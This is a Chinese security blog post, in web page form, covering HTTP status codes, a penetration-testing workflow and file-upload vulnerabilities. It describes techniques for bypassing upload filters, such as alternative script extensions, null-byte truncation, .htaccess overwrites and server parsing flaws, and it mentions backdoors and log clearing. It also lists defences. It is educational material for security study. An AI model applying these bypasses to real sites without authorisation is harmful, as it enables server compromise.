<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>网安奥利给 | BigBug</title><meta name="keywords" content="渗透,内网"><meta name="author" content="BigBug"><meta name="copyright" content="BigBug"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTTP协议理论http协议状态码1xx-提供信息 2xx-请求成功提交 3xx-客户端被重定向到其他资源 4xx-请求包含某种错误 5xx-服务器执行请求时遇到错误  100 Continue当客户端提交一个包含主体的请求时.将发送这个响应。该响应表示已 收到请求消息头.客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。 200 OK本状态码表示已成功提交请求，且响应主体中包含请求结果">
<meta property="og:type" content="article">
<meta property="og:title" content="网安奥利给">
<meta property="og:url" content="https://bigbug888.github.io/posts/20.html">
<meta property="og:site_name" content="BigBug">
<meta property="og:description" content="HTTP协议理论http协议状态码1xx-提供信息 2xx-请求成功提交 3xx-客户端被重定向到其他资源 4xx-请求包含某种错误 5xx-服务器执行请求时遇到错误  100 Continue当客户端提交一个包含主体的请求时.将发送这个响应。该响应表示已 收到请求消息头.客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。 200 OK本状态码表示已成功提交请求，且响应主体中包含请求结果">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202112122042020.jpeg">
<meta property="article:published_time" content="2021-01-29T18:01:12.000Z">
<meta property="article:modified_time" content="2021-12-12T12:42:51.812Z">
<meta property="article:author" content="BigBug">
<meta property="article:tag" content="渗透">
<meta property="article:tag" content="内网">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202112122042020.jpeg"><link rel="shortcut icon" href="https://z3.ax1x.com/2021/11/24/oCuZS1.jpg"><link rel="canonical" href="https://bigbug888.github.io/posts/20"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: BigBug","link":"链接: ","source":"来源: BigBug","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '网安奥利给',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-12-12 20:42:51'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    document.addEventListener('pjax:complete', detectApple)})(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/css/background.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/css/index_ee.css"><meta name="generator" content="Hexo 5.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="BigBug" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://z3.ax1x.com/2021/11/24/oCuZS1.jpg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fa fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/List/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><i class="fa-fw fa fa-suitcase"></i><span> 百宝箱</span></a></div><div class="menus_item"><a class="site-page" href="/Windows/"><i class="fa-fw fa fa-desktop"></i><span> Windows</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202112122042020.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">BigBug</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fa fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/List/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><i class="fa-fw fa fa-suitcase"></i><span> 百宝箱</span></a></div><div class="menus_item"><a class="site-page" href="/Windows/"><i class="fa-fw fa fa-desktop"></i><span> Windows</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">网安奥利给</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-29T18:01:12.000Z" title="发表于 2021-01-30 02:01:12">2021-01-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-12T12:42:51.812Z" title="更新于 2021-12-12 20:42:51">2021-12-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="网安奥利给"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="HTTP协议理论"><a href="#HTTP协议理论" class="headerlink" title="HTTP协议理论"></a>HTTP协议理论</h2><h3 id="http协议状态码"><a href="#http协议状态码" class="headerlink" title="http协议状态码"></a>http协议状态码</h3><pre class="line-numbers language-none"><code class="language-none">1xx-提供信息
2xx-请求成功提交
3xx-客户端被重定向到其他资源
4xx-请求包含某种错误
5xx-服务器执行请求时遇到错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">100 Continue当客户端提交一个包含主体的请求时.将发送这个响应。该响应表示已
收到请求消息头.客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。
200 OK本状态码表示已成功提交请求，且响应主体中包含请求结果。
201 Created. PUT请求的响应返回这个状态码，表示请求已成功提交。
301 Moved Permanently本状态码将浏览器永久重定向到另外一个在Location消息
头中指定 的URL。以后客户端应使用新URL替换原始URL。
302 Found本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL. 客户端 应在随后的请求中恢复使用原始URL. 304 Not Modified本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务
器使用 If-Modified-Since与工f-None-Match消息头确定客户端是否拥有最新版本的
资源
400 Bad Request本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效
的方式修 改请求时（例如在URL中插人一个空格符）,可能会遇到这个状态码。
401 Unauthorized.服务器在许可请求前要求HTTP进行身份验证。WWW- Authenticate消息头详 细说明所支持的身份验证类型。
403 Forbidden本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资
源。
404 Not Found本状态码表示所请求的资源并不存在。
405 Method Not Allowed本状态码表示指定的URL不支持请求中使用的方法。例如，
如果试 图在不支持PUT方法的地方使用该方法，就会收到本状态码。
413 Request Entity Too Large 则本状态码表示请求主体过长，服务器无法处理
414 Request URI Too Longo与前一个响应类似，本状态码表示请求中的URL过长，
服务器无法处理。
500 Internal Server Erroro本状态码表示服务器在执行请求时遇到错误。当提交无法
预料的 输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。
应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。
503 Service Unavailableo通常，本状态码表示尽管Web服务器运转正常.并且能够响
应请求,但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了
某种行为而造成这个结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h3 id="一般的渗透测试流程"><a href="#一般的渗透测试流程" class="headerlink" title="一般的渗透测试流程"></a>一般的渗透测试流程</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212161027414.png"></p>
<h4 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h4><pre class="line-numbers language-none"><code class="language-none"> 确定范围：测试目标的范围、ip、域名、内外网、测试账户。
l 确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。
l 确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞等等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre class="line-numbers language-none"><code class="language-none">在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，
比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、
数据库类型、所有链接页面，用到的框架等。
l 方式：主动扫描，开放搜索等。
l 开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。
l 基础信息：IP、网段、域名、端口。
l 应用信息：各端口的应用。例如web应用、邮件应用、等等。
l 系统信息：操作系统版本
l 版本信息：所有这些探测到的东西的版本。
l 服务信息：中间件的各类信息，插件信息。
l 人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。
l 防护信息：试着看能否探测到防护设备<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><pre class="line-numbers language-none"><code class="language-none">利用上一步中列出的各种系统，应用等使用相应的漏洞。
方法：
(1) 漏扫，awvs，IBM appscan等。
(2) 结合漏洞去exploit-db等位置找利用。
(3) 在网上寻找验证poc。
内容：
l 系统漏洞：系统没有及时打补丁
l WebSever漏洞：WebSever配置问题
l Web应用漏洞：Web应用开发问题
l 其它端口服务漏洞：各种21/8080(st2)/7001/22/3389
l 通信安全：明文传输，token在cookie中传送等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><pre class="line-numbers language-none"><code class="language-none">将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭
建模拟环境进行试验。成功后再应用于目标中。
l 自动化验证：结合自动化扫描工具提供的结果
l 手工验证 : 根据公开资源进行验证
l 试验验证：自己搭建模拟环境进行验证
l 登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息
l 业务漏洞验证：如发现业务漏洞，要进行验证
公开资源的利用
l exploit-db/wooyun/
l google hacking
l 渗透代码网站
l 通用、缺省口令
l 厂商的漏洞警告等等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h4><pre class="line-numbers language-none"><code class="language-none">为下一步实施渗透做准备。
l 精准攻击：准备好上一步探测到的漏洞的exp，用来精准打击
l 绕过防御机制：是否有防火墙等设备，如何绕过
l 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标
l 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等
（免杀）
l 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="利用漏洞获取数据"><a href="#利用漏洞获取数据" class="headerlink" title="利用漏洞获取数据"></a>利用漏洞获取数据</h4><pre class="line-numbers language-none"><code class="language-none">实施攻击：根据前几步的结果，进行攻击
获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）
进一步渗透：内网入侵，敏感目标
持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎
手法等
清理痕迹：清理相关日志（访问，操作），上传文件等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h4><pre class="line-numbers language-none"><code class="language-none">目的：为了最后形成报告，形成测试结果使用。
整理渗透工具：整理渗透过程中用到的代码，poc，exp等
整理收集信息：整理渗透过程中收集到的一切信息
整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="写报告"><a href="#写报告" class="headerlink" title="写报告"></a>写报告</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212161640497.png"></p>
<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212162139536.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212162223449.png"></p>
<h3 id="1-端口收集"><a href="#1-端口收集" class="headerlink" title="1.端口收集"></a>1.端口收集</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212163300653.png"></p>
<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="1-什么是文件上传："><a href="#1-什么是文件上传：" class="headerlink" title="1. 什么是文件上传："></a>1. 什么是文件上传：</h3><p>如果web应用在文件上传过程中没有对文件的安全性进行有效的校验，攻击者就可以通过上传webshell等等恶意文件进行对服务器进行攻击</p>
<p>上传文件的时候，如果服务器的脚本语言没有对文件进行严格的过滤和验证，就可能导致上传恶意的脚本文件，从而控制整个网站，甚至是服务器</p>
<h3 id="2-危害"><a href="#2-危害" class="headerlink" title="2.危害"></a>2.危害</h3><p>​    网站被控制，对文件的增删查改，执行命令，链接数据库</p>
<p>​    如果服务器长时间没有更新的话，就可以尝试提权，导致服务器沦陷</p>
<p>​    同服务器的其他网站沦陷</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211210165543181.png"></p>
<h3 id="3-文件上传漏洞的前提"><a href="#3-文件上传漏洞的前提" class="headerlink" title="3.文件上传漏洞的前提"></a>3.文件上传漏洞的前提</h3><ol>
<li>有文件上传的功能</li>
<li>且上传到的目录，能够解析脚本语言，否则405</li>
<li>能够访问上传的文件</li>
</ol>
<h3 id="4-什么情况下会导致文件上传漏洞"><a href="#4-什么情况下会导致文件上传漏洞" class="headerlink" title="4.什么情况下会导致文件上传漏洞"></a>4.什么情况下会导致文件上传漏洞</h3><ol>
<li><p>本地文件上传被限制：前端js验证</p>
</li>
<li><p>服务端过滤不严格导致被绕过：MIME类型检测绕过，扩展名检测绕过，文件内容绕过，文件解析漏洞导致文件执行（iiis，apache，ngnix）</p>
</li>
<li><p>服务端目录路径检测绕过（文件路径截断（0x00））</p>
</li>
<li><p>服务器配置不当（iis6.0 put直接写文件）</p>
</li>
<li><p>开源编辑器上传漏洞：fckeditor自定义文件名，文件夹结合iis6.0解析漏洞，杀伤力非常强</p>
</li>
</ol>
<p>   ​                                    ewebeditor：可登录后台，配置允许上传类型.asp</p>
<h3 id="5-文件上传限制手段和绕过手段-以及过滤不严被绕过，绕过黑名单"><a href="#5-文件上传限制手段和绕过手段-以及过滤不严被绕过，绕过黑名单" class="headerlink" title="5.文件上传限制手段和绕过手段    以及过滤不严被绕过，绕过黑名单"></a>5.文件上传限制手段和绕过手段    以及过滤不严被绕过，绕过黑名单</h3><p>​    <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212001704524.png"></p>
<ol>
<li><p>绕过js检测：客户端使用js对上传的文件进行限制，不允许上传php结尾的文件，通过修改burp拦截服务器响应包的信息，修改限制条件，让.php为后缀的文件才能够顺利上传</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212002113322.png"></p>
</li>
<li><p>MIME类型检测：</p>
<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212002301086.png" alt="image-20211212002301086" style="zoom: 80%;">

<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212002343110.png" alt="image-20211212002343110" style="zoom:80%;">
</li>
<li><p>过滤不严导致被绕过：有一些网站使用了黑名单过滤掉了一些关键的可执行的脚本的后缀，但是黑名单不全或者被绕过，比如服务端过滤掉了后缀为.php的文件，但是没有过滤掉php3的其他可以执行的脚本文件后缀，攻击者就可以上传其他的可执行的脚本文件的后缀到服务器上</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212003235082.png"></p>
</li>
<li><p>绕过黑名单检测:一般有个专门的blacklist文件,里面包含有常见的危险脚本文件扩展名,如:php,asp,aspx;</p>
<ol>
<li><p>使用大小写绕过：由于windows对大小写不敏感，php改为Php</p>
</li>
<li><p>黑名单绕过（php,php2,php3,php5,phtml,asp,aspx,ascx,cer,asa,jsp,jspx…..）</p>
</li>
<li><p>特殊文件名绕过（后缀加. 或者空格）：如.php改为.php. 或者.php </p>
</li>
<li><p>0x00截断：文件名后缀就一个%00字节，可以截断某些函数对文件名的判断，认为是一个终止符：比如.php.jpg,burp抓包16进制模式php后面添加00；</p>
</li>
<li><p>.htaccess文件攻击：通过move_uploaded_file函数 把自己写的.htaccess文件覆盖掉服务器上就可以解析定义名单了</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212005634248.png"></p>
</li>
<li><p>解析绕过：</p>
<ol>
<li><p>apache解析漏洞：一个文件名为test. php. aaa. bbb. ccc的文件，Apache会从ccc的位置往 php的位置开始尝试解析, 如果ccc不属于Apache能解析的后缀名，那么 Apache就会尝试去解析bbb,这样一直往前尝试，直到遇到 一个能解析的扩展名为止</p>
</li>
<li><p>iis解析漏洞</p>
<ol>
<li><p>iis6.0</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212010627821.png"></p>
</li>
<li><p>iis7.0,7.5</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212010755525.png"></p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<pre><code>     3. nginx解析漏洞</code></pre>
<ol start="7">
<li>其他绕过：  某些情况下管理员错误的服务器配置会导致.html ; .xml等静态页面 后缀的文件也可被执行。 多文件上传时，有时服务器只对第一个上传的文件进行了检查，这 时通过上传多个文件并将 恶意文件掺杂进其中也可绕过服务器的过 滤</li>
</ol>
<h3 id="6-文件上传的保护预防："><a href="#6-文件上传的保护预防：" class="headerlink" title="6.文件上传的保护预防："></a>6.文件上传的保护预防：</h3><p>​    1.上传文件的存储目录不给执行权限 </p>
<p>​    2.隐藏上传文件访问路径 </p>
<p>​    3.文件后缀白名单，注意0x00截断攻击(PHP更新到最新版本) </p>
<p>​    4.不能有本地文件包含漏洞(include dama. jpg) </p>
<p>​    5.及时更新web应用软件避免解析漏洞攻击</p>
<h3 id="7-webshell"><a href="#7-webshell" class="headerlink" title="7.webshell"></a>7.webshell</h3><p>​    常见的文件上传方法就是上传网站木马，webshell就是网站木马文件，根据开发者使用的语言不同，分为asp木马，php木马，jsp木马等等，该类木马利用了脚本语言中的系统命令执行，文件读写等函数的功能，一旦上传到服务器被脚本引擎解析，**攻击者就可以实现对服务器的控制</p>
<p>一句话木马：</p>
